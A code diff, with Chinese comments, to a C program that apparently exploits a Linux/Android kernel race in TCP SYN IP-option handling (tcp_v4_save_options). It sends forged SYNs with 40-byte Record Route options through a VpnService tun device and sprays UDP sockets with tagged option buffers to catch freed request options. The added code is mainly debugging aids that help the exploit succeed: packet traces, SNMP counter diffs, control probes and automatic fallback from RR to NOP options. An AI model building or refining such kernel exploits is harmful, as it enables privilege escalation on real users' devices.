@@ -76,7 +76,9 @@ static uint32_t g_dst;
 /* 源地址必须落在 tun 子网内：SYNACK 要靠这个网段的路由回到 tun，
  * 否则内核会把回包发到真实网卡，我们读不到。README 里“源不在直连子网”
  * 那条是针对有 raw socket + 嗅探的攻击侧，tun 方案不适用。 */
-static uint32_t g_src = 0x0a070763; /* 10.7.7.99 */
+/* 注意字节序：这个值直接按内存写进 IP 头，必须和 inet_addr() 的结果一致。
+ * 0x0a070763 展开是 99.7.7.10（错的），10.7.7.99 是 0x6307070a。 */
+static uint32_t g_src = 0x6307070a; /* 10.7.7.99 */
 static uint16_t g_port = 47777;
 static int g_rounds = 4000;
 
@@ -106,6 +108,38 @@ static uint8_t g_raw_first[64];
 static size_t g_raw_first_len;
 static volatile unsigned g_raw_proto;
 
+/* 诊断：把从 tun 读到的每个包按「版本/协议/端口/标志」记一行，最多 TRACE_N 条。
+ *
+ * 只记摘要不记正文。之前 synack=0 时完全看不出内核回了什么：可能是 RST
+ * （说明没有监听匹配）、ICMP 差错，也可能什么都没回。有这张表就不用再猜。 */
+#define TRACE_N 24
+struct pkt_trace {
+    uint8_t ver, proto, flags, optlen;
+    uint16_t sport, dport;
+    uint16_t iplen;
+    uint32_t saddr, daddr;
+    uint8_t icmp_type, icmp_code;   /* proto=1 时有效 */
+    uint8_t icmp_ptr;               /* Parameter Problem 的指针字段 */
+};
+static struct pkt_trace g_trace[TRACE_N];
+static volatile unsigned g_trace_n;
+/* 回到我们源地址、但不是 SYNACK 的 TCP 包（RST 就是从这里看出来的）。 */
+static volatile unsigned long g_tcp_other, g_rst_seen;
+/* SYNACK 回来了但和我们这一轮的 sport/isn 对不上：说明收包是通的，
+ * 只是匹配条件写错了（或回的包根本不是给这一轮的）。 */
+static volatile unsigned long g_mismatch;
+/* ICMP Parameter Problem 计数：内核拒收我们的 IP 选项时会发这个。 */
+static volatile unsigned long g_icmp_param_prob, g_icmp_unreach;
+/* 真正的 echo reply（type 0）。g_icmp_rx 把差错报文也算进去了，
+ * 用它判断"带选项的包能不能通"会把 ICMP 报错误当成成功。 */
+static volatile unsigned long g_icmp_echo_reply;
+/* 回给我们源端口、但标志不是 SYN+ACK 的 TCP 包：RST 占绝大多数。
+ * 有 RST 说明包进了 TCP 层、只是没有 socket 接住它 —— 和"包没进 TCP"
+ * 是完全不同的两种故障，之前混在一起看不出来。 */
+static volatile unsigned long g_rst_to_us, g_tcp_other_to_us;
+/* 0 = 不带 IP 选项；纯 TCP 通道对照用。 */
+static int g_optlen = 40;
+
 /* 校验和要分两步：先把各段原样求和，最后统一取反一次。
  *
  * 反码运算里 ~x ≡ -x（模 0xFFFF），所以“先取反再当 init 传进去”算出来的
@@ -128,23 +162,55 @@ static uint16_t csum(const void *data, size_t len) {
     return csum_fold(csum_raw(data, len));
 }
 
-/* 40 字节 RR 选项：len=39 + 末尾 NOP；第 3 字节起是 4 字节标记 */
-static void build_opts(uint8_t *o, uint32_t tag) {
-    memset(o, 1, OPT_MAXLEN);
-    o[0] = 7;
-    o[1] = OPT_MAXLEN - 1;
-    o[2] = 4;
+/* 选项构造。
+ *
+ * 两种形态：
+ *   OPT_KIND_RR  —— 40 字节 RR（len=39，pointer=4），第 3 字节起塞 4 字节标记；
+ *   OPT_KIND_NOP —— 全 NOP 填充到指定长度，永远合法，用来做长度扫描。
+ *
+ * 之所以要有 NOP 变体：RR 带指针语义，内核在收包时会按指针写回地址，
+ * 一旦指针/长度组合不被接受，整包在 ip_rcv_options 里就被丢了，而且
+ * 丢得悄无声息（ICMP 参数错误还会被限速）。用 NOP 能先确认"带选项的
+ * SYN 到底能不能通"，再决定要不要坚持 RR。 */
+enum opt_kind { OPT_KIND_RR, OPT_KIND_NOP };
+static enum opt_kind g_opt_kind = OPT_KIND_RR;
+
+static void build_opts_kind(uint8_t *o, size_t len, uint32_t tag, enum opt_kind kind) {
+    memset(o, 1, len);              /* 1 = NOP */
+    if (kind == OPT_KIND_NOP || len < 7) return;
+    /* RR 撑满 40 字节：len=39 + 末尾 NOP，第 3 字节起是 4 字节标记。
+     *
+     * 用满长度是有意的：内核收包时 __ip_options_compile 会把本机地址写进
+     * RR 的第一个地址槽（反汇编 0xea0734：地址落在选项起点 +3 处），
+     * 而回包时 ip_options_build 还会再写一次 __data[rr + optlen - 5]
+     * （反汇编 0xea003c 一带）。optlen=39 时后者落在 __data[34..37]，
+     * 离标记（__data[3..6]）很远；换成短 RR 就会正好压掉标记，
+     * is_spray_tag 立刻失效。所以长度不能随便缩。
+     *
+     * 注意：收包时写地址槽这一步会覆盖标记，也就是说**回来**的 SYNACK
+     * 里 opts[3..6] 可能是内核写进去的本机地址，不一定是我们的 tag。
+     * 判命中时不要只认 tag，optlen 偏离 40 才是主判据。
+     */
+    o[0] = 7;                       /* RR */
+    o[1] = (uint8_t)(len - 1);      /* 选项长度 */
+    o[2] = 4;                       /* pointer：第一个空槽 */
     o[3] = (uint8_t)(tag >> 24);
     o[4] = (uint8_t)(tag >> 16);
     o[5] = (uint8_t)(tag >> 8);
     o[6] = (uint8_t)tag;
 }
 
+static void build_opts(uint8_t *o, uint32_t tag) {
+    build_opts_kind(o, OPT_MAXLEN, tag, g_opt_kind);
+}
+
 static size_t build_pkt(uint8_t *buf, uint16_t sport, uint32_t seq, uint32_t ack, uint8_t flags) {
     uint8_t opts[OPT_MAXLEN];
-    build_opts(opts, 0x52550000u | (seq & 0xffff));
+    size_t optlen = (size_t)g_optlen;
+    if (optlen > OPT_MAXLEN) optlen = OPT_MAXLEN;
+    if (optlen) build_opts(opts, 0x52550000u | (seq & 0xffff));
 
-    size_t ihl = 20 + OPT_MAXLEN, total = ihl + 20;
+    size_t ihl = 20 + optlen, total = ihl + 20;
     memset(buf, 0, total);
     buf[0] = (uint8_t)(0x40 | (ihl / 4));
     buf[1] = 0;
@@ -154,8 +220,8 @@ static size_t build_pkt(uint8_t *buf, uint16_t sport, uint32_t seq, uint32_t ack
     buf[9] = 6;
     *(uint32_t *)(buf + 12) = g_src;
     *(uint32_t *)(buf + 16) = g_dst;
-    memcpy(buf + 20, opts, OPT_MAXLEN);
-    *(uint16_t *)(buf + 10) = csum(buf, 20 + OPT_MAXLEN);
+    if (optlen) memcpy(buf + 20, opts, optlen);
+    *(uint16_t *)(buf + 10) = csum(buf, 20 + optlen);
 
     uint8_t *tcp = buf + ihl;
     *(uint16_t *)(tcp + 0) = htons(sport);
@@ -214,14 +280,54 @@ static void *reader(void *arg) {
             g_raw_proto = buf[9];
         }
         g_raw_rx++;
-        if ((buf[0] >> 4) == 4 && buf[9] == 1) g_icmp_rx++;   /* ICMP */
+        if ((buf[0] >> 4) == 4 && buf[9] == 1) {
+            g_icmp_rx++;
+            size_t cihl = (buf[0] & 0x0f) * 4;
+            if ((size_t)n >= cihl + 2) {
+                if (buf[cihl] == 12) g_icmp_param_prob++;
+                else if (buf[cihl] == 3) g_icmp_unreach++;
+                else if (buf[cihl] == 0) g_icmp_echo_reply++;
+            }
+        }
         size_t ihl = (buf[0] & 0x0f) * 4;
+        /* 记账：把每个包按摘要记一行，synack=0 时靠它判断内核到底回了什么。 */
+        if (g_trace_n < TRACE_N) {
+            struct pkt_trace t;
+            memset(&t, 0, sizeof(t));
+            t.ver = (uint8_t)(buf[0] >> 4);
+            t.proto = buf[9];
+            t.iplen = (uint16_t)n;
+            if (t.ver == 4) {
+                t.saddr = *(uint32_t *)(buf + 12);
+                t.daddr = *(uint32_t *)(buf + 16);
+                if (buf[9] == 1 && (size_t)n >= ihl + 8) {
+                    const uint8_t *ic = buf + ihl;
+                    t.icmp_type = ic[0];
+                    t.icmp_code = ic[1];
+                    t.icmp_ptr = ic[4];
+                }
+            }
+            if (t.ver == 4 && (size_t)n >= ihl + 20 && buf[9] == 6) {
+                const uint8_t *tp = buf + ihl;
+                t.sport = ntohs(*(uint16_t *)(tp + 0));
+                t.dport = ntohs(*(uint16_t *)(tp + 2));
+                t.flags = tp[13];
+                t.optlen = (uint8_t)(ihl - 20);
+            }
+            g_trace[g_trace_n++] = t;
+        }
         if ((buf[0] >> 4) != 4 || buf[9] != 6 || (size_t)n < ihl + 20) continue;
         if (*(uint32_t *)(buf + 16) != g_src) continue;
         const uint8_t *tcp = buf + ihl;
         uint16_t sport = ntohs(*(uint16_t *)(tcp + 0));
         uint16_t dport = ntohs(*(uint16_t *)(tcp + 2));
         uint8_t flags = tcp[13];
+        g_tcp_other++;
+        if (flags & 0x04) g_rst_seen++;
+        if (dport >= 20000) {           /* 我们的随机源端口段 */
+            g_tcp_other_to_us++;
+            if (flags & 0x04) g_rst_to_us++;
+        }
         /* 内核回的 SYNACK：源端口是监听端口 g_port，目的端口是我们随机选的
          * sport。之前查的是 dport == g_port，于是每个 SYNACK 都在这里被丢掉，
          * 表现就是 tx 涨而 synack 永远是 0。 */
@@ -263,7 +369,8 @@ static volatile uint32_t g_spray_gen;
 static int spray_alloc(uint32_t tag) {
     uint8_t opts[OPT_MAXLEN];
     memset(opts, 0, sizeof(opts));
-    build_opts(opts, tag);
+    /* 喷淋对象固定用 RR：命中判定靠 opts[3] 的标记，和 SYN 用哪种选项无关。 */
+    build_opts_kind(opts, OPT_MAXLEN, tag, OPT_KIND_RR);
     int made = 0;
     for (int i = 0; i < SPRAY_SOCKS; i++) {
         int fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -384,18 +491,20 @@ static void spray_stop(void) {
  *   一个包都不回    → 包没有进入内核栈，问题在 VpnService 语义、路由或
  *                      rp_filter，再怎么调 TCP 参数都没用
  */
-static size_t build_icmp_echo(uint8_t *buf) {
-    const size_t ihl = 20, icmp_len = 8 + 16;
+static size_t build_icmp_echo_ex(uint8_t *buf, size_t optlen) {
+    if (optlen > OPT_MAXLEN) optlen = OPT_MAXLEN;
+    const size_t ihl = 20 + optlen, icmp_len = 8 + 16;
     const size_t total = ihl + icmp_len;
     memset(buf, 0, total);
 
-    buf[0] = 0x45;
+    buf[0] = (uint8_t)(0x40 | (ihl / 4));
     *(uint16_t *)(buf + 2) = htons((uint16_t)total);
     *(uint16_t *)(buf + 4) = htons(0x1234);
     buf[8] = 64;
     buf[9] = 1;                    /* ICMP */
     *(uint32_t *)(buf + 12) = g_src;
     *(uint32_t *)(buf + 16) = g_dst;
+    if (optlen) memset(buf + 20, 1, optlen);   /* 全 NOP：最保守的合法选项 */
     *(uint16_t *)(buf + 10) = csum(buf, ihl);
 
     uint8_t *icmp = buf + ihl;
@@ -408,8 +517,10 @@ static size_t build_icmp_echo(uint8_t *buf) {
     return total;
 }
 
+static size_t build_icmp_echo(uint8_t *buf) { return build_icmp_echo_ex(buf, 0); }
+
 static int channel_selftest(void) {
-    uint8_t pkt[128];
+    uint8_t pkt[192];
     size_t len = build_icmp_echo(pkt);
     unsigned long before = g_icmp_rx;
     say("[chan] 发送 ICMP echo → 10.7.7.1（测试包能否进入内核栈）");
@@ -433,6 +544,404 @@ static int channel_selftest(void) {
     say("[!] 可能原因：tun 没把 10.7.7.0/24 路由进来、rp_filter 丢弃了伪造源、");
     say("[!]           或 VpnService 未处于已建立状态");
     return 1;
+}
+
+/* /proc/net/snmp 差分：判定"内核到底有没有把我们的包算进去"。
+ *
+ * 只看四个数：
+ *   Ip:InReceives  —— 进了 ip_rcv 的包数（没涨 = 包没进 IP 层）
+ *   Ip:InHdrErrors —— 头错误（选项被拒就涨在这里）
+ *   Tcp:InSegs     —— 进了 TCP 层的段数
+ *   Tcp:InErrs / InCsumErrors —— 校验和错、格式错
+ *
+ * 读不到就返回 -1，调用方按"没有这个证据"处理，不影响主流程。
+ */
+#define SNMP_MAX 32
+struct snmp_snap {
+    unsigned long in_receives, in_hdr_errors;
+    unsigned long tcp_in_segs, tcp_in_errs, tcp_csum_errs;
+    int valid;
+};
+
+static int snmp_read(struct snmp_snap *out) {
+    memset(out, 0, sizeof(*out));
+    FILE *f = fopen("/proc/net/snmp", "r");
+    if (f == NULL) return -1;
+    char line[4096];
+    int saw_ip = 0, saw_tcp = 0;
+    while (fgets(line, sizeof(line), f) != NULL) {
+        if (strncmp(line, "Ip: ", 4) == 0 && !saw_ip) {
+            /* 第一行是表头，第二行才是数值 —— 用计数器保证只取数值行。 */
+            saw_ip = 1;
+            continue;
+        }
+        if (saw_ip == 1) {
+            /* 这一行是 Ip 的数值行 */
+            unsigned long v[SNMP_MAX];
+            int n = 0;
+            char *p2 = line + 4;
+            while (n < SNMP_MAX && *p2) {
+                v[n++] = strtoul(p2, &p2, 10);
+                while (*p2 == ' ') p2++;
+            }
+            /* Ip 表头：Forwarding DefaultTTL InReceives InHdrErrors InAddrErrors ... */
+            if (n > 3) { out->in_receives = v[2]; out->in_hdr_errors = v[3]; }
+            saw_ip = 2;
+            continue;
+        }
+        if (strncmp(line, "Tcp: ", 5) == 0 && saw_tcp == 0) {
+            saw_tcp = 1;
+            continue;
+        }
+        if (saw_tcp == 1) {
+            unsigned long v[SNMP_MAX];
+            int n = 0;
+            char *p2 = line + 5;
+            while (n < SNMP_MAX && *p2) {
+                v[n++] = strtoul(p2, &p2, 10);
+                while (*p2 == ' ') p2++;
+            }
+            /* Tcp 表头：RtoAlgorithm RtoMin RtoMax MaxConn ActiveOpens PassiveOpens
+             * AttemptFails EstabResets CurrEstab InSegs OutSegs RetransSegs InErrs OutRsts InCsumErrors */
+            if (n > 15) {
+                out->tcp_in_segs = v[9];
+                out->tcp_in_errs = v[12];
+                out->tcp_csum_errs = v[15];
+            }
+            saw_tcp = 2;
+            continue;
+        }
+    }
+    fclose(f);
+    out->valid = (saw_ip == 2 && saw_tcp == 2) ? 1 : 0;
+    return out->valid ? 0 : -1;
+}
+
+static void snmp_report(const struct snmp_snap *before, const struct snmp_snap *after) {
+    if (!before->valid || !after->valid) {
+        say("[snmp] 读不到 /proc/net/snmp（Android 通常限制 untrusted_app），跳过这项证据");
+        return;
+    }
+    long ir = (long)(after->in_receives - before->in_receives);
+    long ih = (long)(after->in_hdr_errors - before->in_hdr_errors);
+    long ts = (long)(after->tcp_in_segs - before->tcp_in_segs);
+    long te = (long)(after->tcp_in_errs - before->tcp_in_errs);
+    long tc = (long)(after->tcp_csum_errs - before->tcp_csum_errs);
+    say("[snmp] Ip:InReceives %+ld  InHdrErrors %+ld", ir, ih);
+    say("[snmp] Tcp:InSegs %+ld  InErrs %+ld  InCsumErrors %+ld", ts, te, tc);
+    if (ih > 0) {
+        say("[snmp] 结论：有包在 IP 头解析阶段就被丢了 —— IP 选项很可能不被接受");
+    } else if (ts > 0) {
+        say("[snmp] 结论：段进了 TCP 层，没收到 SYNACK 要往 TCP 处理/回包方向查");
+    } else if (ir > 0) {
+        say("[snmp] 结论：包进了 IP 层但没到 TCP —— 看是不是被路由/本地投递丢了");
+    }
+}
+
+/* 打印包摘要表：synack=0 时唯一能告诉我们内核回了什么的东西。 */
+static void dump_trace(void) {
+    if (g_trace_n == 0) {
+        say("[trace] 一个包都没回到 tun");
+        return;
+    }
+    say("[trace] 从 tun 读到的前 %u 个包：", g_trace_n);
+    for (unsigned i = 0; i < g_trace_n; i++) {
+        const struct pkt_trace *t = &g_trace[i];
+        const uint8_t *sa = (const uint8_t *)&t->saddr;
+        const uint8_t *da = (const uint8_t *)&t->daddr;
+        if (t->proto == 6) {
+            say("[trace] %u.%u.%u.%u:%u → %u.%u.%u.%u:%u flags=%02x iplen=%u ipopt=%u",
+                sa[0], sa[1], sa[2], sa[3], t->sport,
+                da[0], da[1], da[2], da[3], t->dport,
+                t->flags, t->iplen, t->optlen);
+        } else if (t->proto == 1) {
+            say("[trace] ICMP type=%u code=%u ptr=%u %u.%u.%u.%u → %u.%u.%u.%u",
+                t->icmp_type, t->icmp_code, t->icmp_ptr,
+                sa[0], sa[1], sa[2], sa[3], da[0], da[1], da[2], da[3]);
+            if (t->icmp_type == 12) {
+                say("[trace]   ↑ ICMP Parameter Problem：内核认为 IP 头第 %u 字节有问题", t->icmp_ptr);
+            }
+        } else {
+            say("[trace] proto=%u %u.%u.%u.%u → %u.%u.%u.%u iplen=%u",
+                t->proto, sa[0], sa[1], sa[2], sa[3],
+                da[0], da[1], da[2], da[3], t->iplen);
+        }
+    }
+}
+
+/* 定义在后面：对照自检要用到它们。 */
+static int syn_round(uint16_t *sport_out, uint32_t *seq_out, struct synack *out);
+static void complete(uint16_t sport, uint32_t isn, uint32_t peer_seq);
+
+/* 对照自检：同样的 SYN，不带 IP 选项再打一遍。
+ *
+ * 这是把「TCP 通道不通」和「IP 选项被内核拒绝」分开的最快办法：
+ *   不带选项能拿到 SYNACK → 通道没问题，问题在选项本身（长度/类型/校验）；
+ *   不带选项也拿不到     → 通道或监听没配对，先别管选项。
+ */
+/* 打 5 个 SYN，返回拿到 SYNACK 的个数。 */
+static int try_syns(int n) {
+    int got = 0;
+    for (int i = 0; i < n; i++) {
+        uint16_t sport;
+        uint32_t isn;
+        struct synack s;
+        if (!syn_round(&sport, &isn, &s)) continue;
+        got++;
+        complete(sport, isn, s.seq);
+    }
+    return got;
+}
+
+/* 决定性探针：用**本机 socket** 发一个带 40 字节 IP 选项的 SYN。
+ *
+ * 为什么这条最值得先做：它完全绕开 tun 的投递问题。setsockopt(IP_OPTIONS)
+ * 让内核自己生成一个带选项的 SYN，走的正是 tcp_v4_save_options() 那条路
+ * ——也就是漏洞的入口。连得上就证明"带选项的 SYN 能进请求队列"，
+ * 连不上就说明这条路本身不通，不用再折腾 tun。
+ *
+ * 顺带把 connect 的错误码打出来：EINVAL/EOPNOTSUPP 通常是选项被拒，
+ * ETIMEDOUT 是没回包，ECONNREFUSED 是监听没起来。
+ */
+static int probe_local_connect(void) {
+    /* 监听 127.0.0.1 的临时端口：和 tun 无关，纯粹验选项。
+     * 本应用进了 VPN 也不影响这条：VPN 只路由 10.7.7.0/24，loopback 不在其中。 */
+    int ls = socket(AF_INET, SOCK_STREAM, 0);
+    if (ls < 0) { say("[local] listener socket 失败 errno=%d", errno); return 1; }
+    int one = 1;
+    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+
+    struct sockaddr_in a;
+    memset(&a, 0, sizeof(a));
+    a.sin_family = AF_INET;
+    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    a.sin_port = 0;
+    if (bind(ls, (struct sockaddr *)&a, sizeof(a)) < 0 || listen(ls, 8) < 0) {
+        say("[local] 监听 127.0.0.1 失败 errno=%d", errno);
+        close(ls);
+        return 1;
+    }
+    socklen_t alen = sizeof(a);
+    getsockname(ls, (struct sockaddr *)&a, &alen);
+
+    /* 对照 ①：不带选项。 */
+    for (int round = 0; round < 2; round++) {
+        int c = socket(AF_INET, SOCK_STREAM, 0);
+        if (c < 0) { close(ls); return 1; }
+        int rc = 0;
+        if (round == 1) {
+            uint8_t opts[OPT_MAXLEN];
+            build_opts_kind(opts, OPT_MAXLEN, 0x4c4f4341u, OPT_KIND_RR);
+            if (setsockopt(c, IPPROTO_IP, IP_OPTIONS, opts, OPT_MAXLEN) < 0) {
+                say("[local] %s：setsockopt(IP_OPTIONS) 失败 errno=%d（%s）",
+                    round == 0 ? "不带选项" : "带 40 字节 RR", errno, strerror(errno));
+                close(c);
+                continue;
+            }
+        }
+        rc = connect(c, (struct sockaddr *)&a, sizeof(a));
+        int err = errno;
+        if (rc == 0) {
+            say("[local] %s：connect 成功 ✅", round == 0 ? "不带选项" : "带 40 字节 RR");
+        } else {
+            say("[local] %s：connect 失败 errno=%d（%s）",
+                round == 0 ? "不带选项" : "带 40 字节 RR", err, strerror(err));
+        }
+        close(c);
+        if (round == 0 && rc != 0) {
+            say("[local] 连不带选项都连不上，本机 TCP 栈有问题，后面不用测了");
+            close(ls);
+            return 1;
+        }
+        if (round == 1) {
+            close(ls);
+            if (rc == 0) {
+                say("[local] 结论：内核接受带 40 字节 IP 选项的 SYN，漏洞入口可达 ✅");
+                say("[local] → 问题在 tun 的投递/回包路径，不在选项本身");
+                return 0;
+            }
+            say("[local] 结论：带选项的 SYN 被内核拒绝 —— 漏洞入口在本机不成立");
+            return 2;
+        }
+    }
+    close(ls);
+    return 1;
+}
+
+/* 决定性探针：ICMP echo **带 40 字节 IP 选项**。
+ *
+ * 这是把「IP 选项在收包路径上被拒」和「TCP 特定问题」分开的唯一干净办法：
+ *   带选项的 ICMP 能收到 reply → 内核接受带选项的入站包，问题在 TCP 层
+ *   带选项的 ICMP 收不到    → IP 层就把带选项的包丢了，SYN 再试也没用
+ *
+ * 之所以用 ICMP 而不是 TCP：它不牵扯监听、端口、序列号，只走
+ * ip_rcv → ip_rcv_options → icmp_rcv 这一条最短路径。
+ */
+static int probe_ipopt_icmp(void) {
+    uint8_t pkt[192];
+    unsigned long before = g_icmp_echo_reply;
+
+    say("[opt-icmp] 发 3 个带 40 字节 NOP 选项的 ICMP echo");
+    for (int i = 0; i < 3; i++) {
+        size_t len = build_icmp_echo_ex(pkt, 40);
+        tx(pkt, len);
+        usleep(15 * 1000);
+    }
+    for (int i = 0; i < 40 && g_icmp_echo_reply == before; i++) usleep(10 * 1000);
+
+    unsigned long got = g_icmp_echo_reply - before;
+    if (got > 0) {
+        say("[opt-icmp] 收到 %lu 个 ICMP 回包：内核接受带 IP 选项的入站包 ✅", got);
+        say("[opt-icmp] → 问题不在 IP 层，往 TCP 处理/回包方向查");
+        return 0;
+    }
+    say("[opt-icmp] 一个回包都没有：带 IP 选项的包在 IP 层就被丢了");
+    if (g_icmp_param_prob > 0) {
+        say("[opt-icmp] 期间收到 %lu 个 ICMP Parameter Problem，确认是选项被拒",
+            g_icmp_param_prob);
+    }
+    say("[opt-icmp] → SYN 带选项这条路在本机不成立");
+    return 1;
+}
+
+/* 闭端口探针：往一个**没有监听**的端口发 SYN，看有没有 RST 回到 tun。
+ *
+ * 这是判定"TCP 这条路通不通"最干净的一步，比看 SYNACK 更基础：
+ *   收到 RST   → 包确实进了 TCP、内核也把回包路由回 tun，TCP 通道完全正常
+ *   什么都没有 → TCP 层根本没处理这些包，问题在 IP 层或投递方向
+ *
+ * 之前 synack 恒为 0 时，raw_rx 有几个包但没有一个 SYNACK，光凭这个
+ * 分不清"内核没回"和"回了别的"。这条探针一次就能定死。
+ */
+static int probe_closed_port(void) {
+    int saved_len = g_optlen;
+    enum opt_kind saved_kind = g_opt_kind;
+    g_optlen = 0;                      /* 先不带选项，排除变量 */
+    unsigned long rst_before = g_rst_seen;
+    unsigned long tcp_before = g_tcp_other;
+
+    uint16_t sport = (uint16_t)(40000 + (rand() % 20000));
+    uint8_t pkt[128];
+
+    /* 先挑一个**确认**没有监听者的端口：能 bind 上就说明是空的。 */
+    uint16_t closed_port = 0;
+    for (int i = 0; i < 20 && closed_port == 0; i++) {
+        uint16_t cand = (uint16_t)(30000 + (rand() % 20000));
+        int t = socket(AF_INET, SOCK_STREAM, 0);
+        if (t < 0) break;
+        struct sockaddr_in a;
+        memset(&a, 0, sizeof(a));
+        a.sin_family = AF_INET;
+        a.sin_port = htons(cand);
+        a.sin_addr.s_addr = htonl(INADDR_ANY);
+        if (bind(t, (struct sockaddr *)&a, sizeof(a)) == 0) closed_port = cand;
+        close(t);
+    }
+    if (closed_port == 0) {
+        say("[closed] 找不到空闲端口做对照，跳过");
+        g_optlen = saved_len;
+        g_opt_kind = saved_kind;
+        return 1;
+    }
+    say("[closed] 往闭端口 %u 发一个 SYN（期望收到 RST）", (unsigned)closed_port);
+
+    uint16_t saved_port = g_port;
+    g_port = closed_port;
+    size_t len = build_pkt(pkt, sport, 0x5a5a5a5a, 0, 0x02);
+    g_port = saved_port;
+    tx(pkt, len);
+
+    for (int i = 0; i < 30 && g_rst_seen == rst_before; i++) usleep(10 * 1000);
+
+    g_optlen = saved_len;
+    g_opt_kind = saved_kind;
+
+    if (g_rst_seen > rst_before) {
+        say("[closed] 收到 RST：TCP 通道正常（包进了 TCP，回包也能回到 tun）");
+        return 0;
+    }
+    say("[closed] 没有 RST（TCP 包共 %lu 个）：TCP 层没处理这些包",
+        g_tcp_other - tcp_before);
+    return 1;
+}
+
+/* 通道能力探测：决定"带选项的 SYN 到底能不能通"，并自动选一种能用的选项形态。
+ *
+ * 返回值：
+ *   0  带选项的 SYN 能通（g_opt_kind / g_optlen 已改成能用的那一种）
+ *   1  连不带选项都不通 —— 通道或监听的问题
+ *   2  通道正常但任何 IP 选项都被拒 —— 这条入口在本机不成立
+ *
+ * 为什么要有它：之前 4000 轮里 synack 恒为 0，而"通道不通"和"选项被拒"
+ * 两种原因都说得通，靠猜白烧了好几轮真机时间。现在用三次对照把它们分开，
+ * 并且在 RR 不通、NOP 能通时自动降级 —— RR 只是用来携带标记，竞态本身
+ * 不依赖它，换 NOP 一样能拿到 ireq_opt。
+ */
+static int control_no_options(void) {
+    int saved_len = g_optlen;
+    enum opt_kind saved_kind = g_opt_kind;
+    struct snmp_snap sb, sa;
+
+    /* ① 不带选项 —— 通道基线。 */
+    g_optlen = 0;
+    snmp_read(&sb);
+    say("[ctrl] ① 不带 IP 选项：发 5 个 SYN");
+    int base = try_syns(5);
+    snmp_read(&sa);
+    say("[ctrl] ① %d/5 拿到 SYNACK", base);
+    snmp_report(&sb, &sa);
+    if (base == 0) {
+        g_optlen = saved_len;
+        g_opt_kind = saved_kind;
+        return 1;
+    }
+
+    /* ② 40 字节全 NOP —— 只测"能不能带选项"，不牵扯 RR 的指针语义。 */
+    g_opt_kind = OPT_KIND_NOP;
+    g_optlen = 40;
+    snmp_read(&sb);
+    say("[ctrl] ② 40 字节全 NOP 选项：发 5 个 SYN");
+    int nop40 = try_syns(5);
+    snmp_read(&sa);
+    say("[ctrl] ② %d/5 拿到 SYNACK", nop40);
+    snmp_report(&sb, &sa);
+
+    /* ③ 原来的 RR 形态 —— 和 ② 对比就知道是不是 RR 本身的问题。 */
+    g_opt_kind = OPT_KIND_RR;
+    g_optlen = 40;
+    say("[ctrl] ③ 40 字节 RR 选项（当前实现）：发 5 个 SYN");
+    int rr40 = try_syns(5);
+    say("[ctrl] ③ %d/5 拿到 SYNACK", rr40);
+
+    if (rr40 > 0) {
+        say("[OK] RR 选项能通，按原方案继续");
+        g_opt_kind = OPT_KIND_RR;
+        g_optlen = saved_len > 0 ? saved_len : 40;
+        return 0;
+    }
+    if (nop40 > 0) {
+        say("[!] RR 被拒、NOP 能通 —— 自动降级到 NOP 选项继续跑");
+        say("[i] 代价：没有 4 字节标记，命中判定只看 optlen 是否偏离 40");
+        g_opt_kind = OPT_KIND_NOP;
+        g_optlen = 40;
+        return 0;
+    }
+
+    /* ④ 短选项，排除"长度超阈值"这种解释。 */
+    g_optlen = 4;
+    say("[ctrl] ④ 4 字节 NOP 选项：发 3 个 SYN");
+    int nop4 = try_syns(3);
+    say("[ctrl] ④ %d/3 拿到 SYNACK", nop4);
+
+    g_optlen = saved_len;
+    g_opt_kind = saved_kind;
+    if (nop4 > 0) {
+        say("[!] 短选项能通、40 字节不通 —— 是长度问题，不是选项类型");
+    } else {
+        say("[!] 只要带 IP 选项就一个 SYNACK 都没有 —— 内核在 IP 层就丢了");
+        say("[!] 这条路（SYN 带选项进 tcp_v4_save_options）在本机不成立");
+    }
+    return 2;
 }
 
 /* ------------------------------------------------------------ 监听端
@@ -462,11 +971,22 @@ static int listen_open(uint16_t port) {
     addr.sin_addr.s_addr = g_dst;
 
     if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        say("[listen] bind %u.%u.%u.%u:%u 失败 errno=%d（地址还没配上？）",
+        int first = errno;
+        /* 退路：绑 0.0.0.0。tun 地址刚配上时，绑定具体地址可能因为
+         * 地址还没在表里而失败（EADDRNOTAVAIL）；通配绑定能接住任何
+         * 目的地址的 SYN，对这条链完全够用 —— 我们只关心内核会不会
+         * 为这个 SYN 建请求 sock。 */
+        addr.sin_addr.s_addr = htonl(INADDR_ANY);
+        if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+            say("[listen] bind %u.%u.%u.%u:%u 失败 errno=%d（退到 0.0.0.0 也失败 errno=%d）",
+                g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff,
+                (g_dst >> 24) & 0xff, port, first, errno);
+            close(fd);
+            return -1;
+        }
+        say("[listen] 绑 %u.%u.%u.%u 失败（errno=%d），已退到 0.0.0.0:%u 监听",
             g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff,
-            (g_dst >> 24) & 0xff, port, errno);
-        close(fd);
-        return -1;
+            (g_dst >> 24) & 0xff, first, port);
     }
     if (listen(fd, 128) < 0) {
         say("[listen] listen 失败 errno=%d", errno);
@@ -477,8 +997,17 @@ static int listen_open(uint16_t port) {
     int flags = fcntl(fd, F_GETFL, 0);
     fcntl(fd, F_SETFL, flags | O_NONBLOCK);
     /* g_dst 是 inet_addr 的返回值，已经是网络序；按字节顺序打印才正确。 */
-    say("[listen] 已在 %u.%u.%u.%u:%u 监听",
-        g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff, (g_dst >> 24) & 0xff, port);
+    /* 回读实际绑定的地址：绑定成功不等于绑到了你以为的那个地址。 */
+    struct sockaddr_in bound;
+    socklen_t blen = sizeof(bound);
+    if (getsockname(fd, (struct sockaddr *)&bound, &blen) == 0) {
+        const uint8_t *b = (const uint8_t *)&bound.sin_addr.s_addr;
+        say("[listen] 实际监听 %u.%u.%u.%u:%u",
+            b[0], b[1], b[2], b[3], ntohs(bound.sin_port));
+    } else {
+        say("[listen] 已在 %u.%u.%u.%u:%u 监听",
+            g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff, (g_dst >> 24) & 0xff, port);
+    }
     return fd;
 }
 
